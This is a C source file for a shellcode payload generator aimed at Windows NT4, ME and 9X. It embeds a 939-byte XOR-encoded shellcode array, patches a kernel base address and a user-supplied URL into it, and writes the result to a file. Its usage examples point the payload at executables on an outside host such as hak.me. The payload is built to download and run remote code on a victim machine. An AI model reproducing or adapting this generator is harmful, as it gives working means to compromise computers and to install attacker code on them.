#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <io.h>
#include <fcntl.h>
#include <conio.h>

//------------------------------------------------------------------------------//

#define SHELLCODE_SIZE          939
#define CODEC_BYTE              0x88
#define KERNALBASE_OFFSET       43
#define TARGETURL_OFFSET        SHELLCODE_SIZE-93

#define KERNBASE_9X             0xBFF70000
#define KERNBASE_ME             0xBFF60000
#define KERNBASE_NT4            0x77F00000

char shellcode[939] = "\xEB\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF\xFF\x61\x78\x88"
                      "\x88\x88\xD0\xDD\x01\x6D\x09\x64\xA4\x88\x88\x88\x01\xCD\x5C\x4F\xCD\x74\x88\x88\x7F\x37\x03\xCD\x74"
                      "\xEE\x09\xB0\xC5\xD2\xFD\xF4\x8D\xB4\x88\x88\x88\x03\x90\x8B\xD5\x74\xEE\x09\xB3\xD8\xCD\xFD\xE3\x09"
                      "\x4B\xF0\x88\x88\x88\x03\xBB\x8B\xFD\x74\x09\x4E\x90\x88\x88\x88\x25\x01\xCD\x7C\x25\x8B\xCD\x74\x01"
                      "\xCD\x78\x25\x8B\xCD\x74\x01\xCD\x64\x25\x8B\xCD\x74\x01\xCD\x60\xB9\x77\x03\xCD\x5C\x8D\x87\x88\x88"
                      "\x88\x01\xCD\x54\x4F\xCD\x50\x85\x88\x88\x88\x60\xA5\x88\x88\x88\x03\xDD\x54\x01\xDD\x68\x03\xCD\x5C"
                      "\x01\xCD\x54\x4F\xCD\x50\x87\x88\x88\x88\x60\x9D\x88\x88\x88\x03\xDD\x54\x01\xDD\x6C\x03\xCD\x68\x01"
                      "\x5B\x61\xFF\x88\x88\x88\x61\x7E\x88\x88\x88\xB9\x48\x01\xCD\x70\x03\xF5\x70\xB3\xF5\x7C\xF5\xCB\xCF"
                      "\x01\xF5\x70\xB9\x48\x03\xCD\x70\x49\x68\x8A\x03\xD5\x64\x89\x4B\x03\x8B\x8B\xCD\x74\x01\x4F\x03\xFD"
                      "\x54\x03\xC5\x50\x7B\x2E\xFD\x5E\xB9\x48\x03\xCD\x70\x59\x68\x03\xD5\x60\x89\x4B\xB9\x48\xEE\x03\x8B"
                      "\x49\x68\x8A\x03\xD5\x78\x89\x50\x03\x90\x8B\xD5\x74\x01\xD5\x54\x4B\x60\x83\x77\x77\x77\xCF\xED\xFC"
                      "\xD8\xFA\xE7\xEB\xC9\xEC\xEC\xFA\xED\xFB\xFB\x88\xC4\xE7\xE9\xEC\xC4\xE1\xEA\xFA\xE9\xFA\xF1\xC9\x88"
                      "\x61\x0D\x88\x88\x88\xD7\xDD\x01\x6D\x09\x64\x94\x88\x88\x88\x01\xCD\x60\x01\xD5\x6C\x01\xF5\x74\x4F"
                      "\xCD\x64\x8E\x88\x88\x88\x03\xCD\x74\x01\xCD\x7C\x8D\xCE\x88\x88\x88\x01\xCD\x78\x60\xAF\x88\x88\x88"
                      "\x4F\xCD\x64\x8B\x88\x88\x88\x03\xCD\x74\x8D\xC4\x88\x88\x88\x01\xCD\x7C\x8D\xB4\x88\x88\x88\x01\xCD"
                      "\x78\x60\x80\x88\x88\x88\x03\xCD\x74\x61\x46\x88\x88\x88\x03\xCD\x7C\xD8\x77\xDD\x60\x0D\x48\xFC\xA8"
                      "\x01\xCD\x70\x03\xFD\x78\x03\xC5\x64\x03\xD5\x7C\xB9\x48\x24\x89\x4B\x03\xCD\x70\xE8\xDB\xD8\x77\xDD"
                      "\x6C\x01\x8B\xE9\x6A\x62\x4B\x18\x61\x72\x77\x77\x77\x60\xFE\x77\x77\x77\xE3\xED\xFA\xE6\xED\xE4\xBB"
                      "\xBA\xA6\xEC\xE4\xE4\x88\xDE\xE1\xFA\xFC\xFD\xE9\xE4\xC9\xE4\xE4\xE7\xEB\x88\xD7\xE4\xEB\xFA\xED\xE9"
                      "\xFC\x88\xD7\xE4\xFF\xFA\xE1\xFC\xED\x88\xD7\xE4\xEB\xE4\xE7\xFB\xED\x88\xDF\xE1\xE6\xCD\xF0\xED\xEB"
                      "\x88\xCD\xF0\xE1\xFC\xD8\xFA\xE7\xEB\xED\xFB\xFB\x88\x85\x92\xAA\xA2\xBA\xB2\xFF\xE1\xE6\xE1\xE6\xED"
                      "\xFC\xA6\xEC\xE4\xE4\x88\xC1\xE6\xFC\xED\xFA\xE6\xED\xFC\xC7\xF8\xED\xE6\xC9\x88\xC1\xE6\xFC\xED\xFA"
                      "\xE6\xED\xFC\xC7\xF8\xED\xE6\xDD\xFA\xE4\xC9\x88\xC1\xE6\xFC\xED\xFA\xE6\xED\xFC\xDA\xED\xE9\xEC\xCE"
                      "\xE1\xE4\xED\x88\x84\x92\xA3\x18\xB9\x48\xD8\x03\x06\xD3\x88\x88\x88\x77\xD9\xB2\x61\x61\x88\x88\x88"
                      "\xD6\x01\x0E\xD3\x88\x88\x88\xE0\x8C\x88\x88\x88\xE0\x88\x98\x88\x88\xE0\x17\x0E\x89\x88\xE0\x88\x88"
                      "\x88\x88\x03\x06\xD3\x88\x88\x88\x77\xD9\x85\x01\x0E\x88\x88\x88\x88\xB9\x48\xD8\xD8\xD8\xD8\xD8\x03"
                      "\x06\xD3\x88\x88\x88\x77\xD9\xD0\x01\x0E\x8C\x88\x88\x88\xB9\x48\xD8\xD8\xD8\xD8\x05\x0E\x80\x88\x88"
                      "\x88\xD8\x03\x0E\x8C\x88\x88\x88\xD8\x03\x06\xD3\x88\x88\x88\x77\xD9\xEE\x01\x0E\x8C\x88\x88\x88\x05"
                      "\x0E\xDB\x88\x88\x88\xD8\xE0\x17\x0E\x89\x88\x03\x0E\x88\x88\x88\x88\xD8\x03\x0E\x8C\x88\x88\x88\xD8"
                      "\x03\x06\xD3\x88\x88\x88\x77\xD9\xFF\xE0\x88\x88\x88\x88\x05\x0E\xC2\x88\x88\x88\xD8\x03\x06\xD3\x88"
                      "\x88\x88\x77\xD9\x92\x01\x0E\xDF\x88\x88\x88\x03\x0E\xDB\x88\x88\x88\xD8\x03\x0E\x88\x88\x88\x88\xD8"
                      "\x03\x0E\xDF\x88\x88\x88\xD8\x03\x06\xD3\x88\x88\x88\x77\xD9\xAA\x03\x0E\xDF\x88\x88\x88\xD8\x03\x06"
                      "\xD3\x88\x88\x88\x77\xD9\xA2\xE0\x8D\x88\x88\x88\x05\x0E\xC2\x88\x88\x88\xD8\x03\x06\xD3\x88\x88\x88"
                      "\x77\xD9\xBA\x61\x8E\x77\x77\x77\x60\x9A\x77\x77\x77\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88"
                      "\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88"
                      "\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88"
                      "\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\x88\xE1\xFF\xE1\xE6\xA6\xED\xF0\xED\x88\x88\x88\x88\x88"
                      "\x88\x88\x88\x88\x88\x88\x88\x88\x18\x68\x61\x63\x6B\xCD";

//------------------------------------------------------------------------------//

void usage( void )
{
  printf("usage: payload.exe <output file> <remote file URL> <target platform>\n");
  printf("\ntarget platform:\n\t-N\tWindows NT4\n");
  printf("\t-M\tWindows ME\n");
  printf("\t-X\tWindows 9X\n");
  printf("\t-C\tcustom\n");
  printf("e.g. payload.exe http://www.hak.me/hacknt.exe -N\n");
  printf("e.g. payload.exe http://www.hak.me/hackdos.exe -C 0xDEADBEEF\n");
  exit(0);
}

//------------------------------------------------------------------------------//

int main( int argc, char **argv )
{
  unsigned int kernelBase;
  char targetURL[64];
  int fp;

    if( argc < 4 )
      usage();

  strncpy( targetURL, argv[2], sizeof(targetURL) );

    if( !strcmp(argv[3], "-N" ) )
      kernelBase = KERNBASE_NT4;
    else if( !strcmp(argv[3], "-M" ) )
      kernelBase = KERNBASE_ME;
    else if( !strcmp(argv[3], "-X" ) )
      kernelBase = KERNBASE_9X;
    else if( !strcmp(argv[3], "-C" ) && argc > 3)
      kernelBase = strtoul( argv[4], NULL, 0);
    else
      usage();
      
  printf("\n");
  printf("Using Kernal Base:      0x%8.8X\n", kernelBase);
  printf("Using Remote File URL:  %s\n", targetURL);

  shellcode[KERNALBASE_OFFSET] = (kernelBase >> 4)^CODEC_BYTE;
  shellcode[KERNALBASE_OFFSET+1] = (kernelBase >> 8)^CODEC_BYTE;
  shellcode[KERNALBASE_OFFSET+2] = (kernelBase >> 16)^CODEC_BYTE;
  shellcode[KERNALBASE_OFFSET+3] = (kernelBase >> 24)^CODEC_BYTE;

    for( int i=TARGETURL_OFFSET, u=0 ; i<(TARGETURL_OFFSET+strlen(targetURL)) ; i++, u++ )
      shellcode[i] = (targetURL[u]^CODEC_BYTE);
/*
// Outputs changes for debug only...
printf("\n\n");
    for( int i=KERNALBASE_OFFSET ; i<KERNALBASE_OFFSET+4 ; i++ )
      printf("%x", shellcode[i]^CODEC_BYTE);
printf("\n\n");
    for( int i=TARGETURL_OFFSET ; i<SHELLCODE_SIZE ; i++ )
      printf("%c", shellcode[i]^CODEC_BYTE);
*/
  fp = open( argv[1], O_WRONLY|O_CREAT|O_TRUNC|O_BINARY );
    if( fp < 0 )
      printf("error: unable to create file: %s. try deleting it if it allready exists.\n", argv[1]);
    else {
      write( fp, shellcode, SHELLCODE_SIZE);
      close(fp);
      printf("shellcode loaded to file: %s\n", argv[1]);
    }
  return 0;
}
